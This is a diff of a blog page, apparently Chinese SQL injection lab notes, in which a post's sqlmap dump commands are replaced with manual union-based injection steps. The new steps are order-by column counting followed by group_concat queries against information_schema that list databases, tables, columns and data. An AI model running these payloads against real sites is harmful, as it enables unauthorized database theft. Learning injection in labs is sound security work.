@@ -120,7 +120,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">sqlmap的使用</a>
+						<a href="/tags/sql%E5%90%84%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%A2%98/" style="font-size: 10px;">sql各类型解题</a>
 					</div>
 				</section>
 				
@@ -198,7 +198,7 @@
   
     <h1 itemprop="name">
       <a class="article-title" href="/2023/09/11/web/">
-        sqlmap解题
+        sql注入
         
       </a>
     </h1>
@@ -209,15 +209,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ol>
-<li><p>sqlmap -u “url” –batch -D security -T users –columns –dump</p>
-<p>(1)基于错误的GET单引号字符型注入<br>(2)基于错误的GET整型注入<br>(3)基于错误的GET单引号变形注入<br>(4)基于错误的GET双引号字符型注入</p>
-</li>
-<li><p>sqlmap -u “url” –technique E -D security -T users –dump –batch</p>
-<p>(1)基于GET单引号双注入<br>(2)基于GET双引号双注入</p>
-</li>
-<li></li>
-</ol>
+        <p>一、加上单引号报错有输出结果</p>
+<p>​		1、near ‘’1’’ LIMIT 0,1’ at line 1   &#x3D;&gt; 去掉1左边的所有东西，再去掉输入的1’，得到类型为单引号’</p>
+<p>​				解答步骤：（1）判断字段数(使用order by)</p>
+<p>​									（2）判断输出结果的位置(使用select from)</p>
+<p>​									（3）查数据库名：union select group_concat(schema_name) from information_schema.schemata %23</p>
+<p>​									（4）查表名：union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘上方查到的数据库’ %23</p>
+<p>​									（5）查列名：union select group_concat(column_name) from information_schema.columns where table_schema &#x3D;’上方查到的数据库’ and table_name&#x3D;’上方查到的表名’ %23</p>
+<p>​									（6）查字段：union select group_concat(想要查询的字段) from 查询到的列名 %23</p>
 
       
     </div>
@@ -226,7 +225,7 @@
       
       
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">sqlmap的使用</a></li></ul>
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E5%90%84%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%A2%98/" rel="tag">sql各类型解题</a></li></ul>
 	</div>
 
       
